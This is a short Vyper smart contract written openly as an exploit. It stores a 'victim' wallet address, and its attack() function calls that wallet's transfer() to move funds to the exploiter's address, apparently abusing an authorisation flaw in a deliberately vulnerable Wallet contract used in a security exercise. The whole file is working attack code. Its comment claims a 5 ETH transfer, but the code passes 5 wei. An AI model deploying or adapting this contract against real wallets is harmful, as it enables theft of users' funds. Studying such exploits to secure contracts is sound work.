# @version >=0.3.3

# @notice Interface with the Walet contract
interface IWallet:
  def transfer(_to:address, _amount:uint256): nonpayable

owner: address
# @notice The address where the Wallet contract is deployed
victim: public(address)

# @notice Set owner address when the contract is created
@external
def __init__():
    self.owner = msg.sender

# @notice Set the victim address
@external
def setVictim(_victim:address):
    self.victim = _victim

# @notice Transfer 5 ETH to the exploiter
@external
@payable
def attack():
    IWallet(self.victim).transfer(self.owner, 5)

# @notice Default function to receive the winnings.
@external
@payable
def __default__():
    pass

# @notice Helper function to get the balance of the contract
@external
@view
def getBalance() -> uint256:
    return self.balance
